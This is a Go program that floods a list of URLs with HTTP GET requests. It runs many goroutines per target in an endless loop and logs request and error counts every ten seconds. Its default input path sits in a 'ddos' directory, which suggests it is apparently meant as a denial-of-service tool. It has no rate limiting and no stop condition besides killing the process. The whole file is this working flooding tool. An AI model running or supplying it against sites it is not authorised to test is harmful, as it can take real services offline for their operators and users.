package main

import (
	"bufio"
	"flag"
	"fmt"
	"net/http"
	"os"
	"runtime"
	"sync"
	"time"

	"github.com/sirupsen/logrus"
)

type Pool struct {
	startTime  time.Time
	maxWorkers int
	logger     logrus.FieldLogger
	urls       []*Url
	wg         sync.WaitGroup
	httpClient http.Client
}

func NewPool(loglevel string, maxWorkers int) (*Pool, error) {

	logger := logrus.New()
	level, err := logrus.ParseLevel(loglevel)
	if err != nil {
		return nil, err
	}
	logger.Level = level

	return &Pool{
		startTime:  time.Now(),
		maxWorkers: maxWorkers,
		logger:     logger,
		urls:       make([]*Url, 0),
		wg:         sync.WaitGroup{},
		httpClient: http.Client{Timeout: time.Second * 5},
	}, nil
}

func (p *Pool) Populate(arr []string) {
	for _, a := range arr {
		p.addUrl(NewUrl(a))
	}
}

func (p *Pool) addUrl(u *Url) {
	p.urls = append(p.urls, u)
}

func (p *Pool) Run() {
	for _, u := range p.urls {
		uu := u
		for i := 0; i < p.maxWorkers; i++ {
			p.wg.Add(1)
			go func() {
				for {
					select {
					case <-uu.stop:
						p.wg.Done()
						return
					default:
						res, err := p.httpClient.Get(uu.addr)
						if err != nil || res.StatusCode > 299 {
							uu.incrementNumberOfErrors()
						}
						if res != nil {
							res.Body.Close()
						}
						uu.incrementNumberOfRequests()
					}
				}
			}()

		}
	}

	p.wg.Wait()

}

func (p *Pool) printStats() {
	for {
		p.logger.Infof("running for: %v", time.Since(p.startTime))
		p.logger.Infof("number of goroutines: %d", runtime.NumGoroutine())
		for _, u := range p.urls {
			p.logger.Infof("url: %s number of requests: %d number of error responses: %d", u.addr, u.numberOfRequests, u.numberOfErrorResponses)
		}
		fmt.Println()
		time.Sleep(time.Second * 10)
	}
}

type Url struct {
	addr                   string
	numberOfRequests       int
	numberOfErrorResponses int
	stop                   chan bool
	mutex1                 sync.Mutex
	mutex2                 sync.Mutex
}

func NewUrl(addr string) *Url {
	return &Url{
		addr:                   addr,
		numberOfRequests:       0,
		numberOfErrorResponses: 0,
		stop:                   make(chan bool),
		mutex1:                 sync.Mutex{},
		mutex2:                 sync.Mutex{},
	}
}

func (u *Url) incrementNumberOfErrors() {
	u.mutex1.Lock()
	defer u.mutex1.Unlock()
	u.numberOfErrorResponses++
}

func (u *Url) incrementNumberOfRequests() {
	u.mutex2.Lock()
	defer u.mutex2.Unlock()
	u.numberOfRequests++
}

func loadUrls(filepath string) ([]string, error) {
	arr := make([]string, 0)
	file, err := os.Open(filepath)
	if err != nil {
		return nil, err
	}

	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		arr = append(arr, scanner.Text())
	}
	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return arr, nil
}

var urlsFileOpt = flag.String("urls", "/home/hyperxpizza/dev/golang/ddos/urls.txt", "path to json file with the urls")
var loglevelOpt = flag.String("loglevel", "info", "loglevel")
var maxWorkersOpt = flag.Int("maxWorkers", 10, "number of workers per url")

func main() {

	flag.Parse()

	urls, err := loadUrls(*urlsFileOpt)
	if err != nil {
		panic(err)
	}

	pool, err := NewPool(*loglevelOpt, *maxWorkersOpt)
	if err != nil {
		panic(err)
	}

	pool.Populate(urls)
	go pool.printStats()
	pool.Run()

}
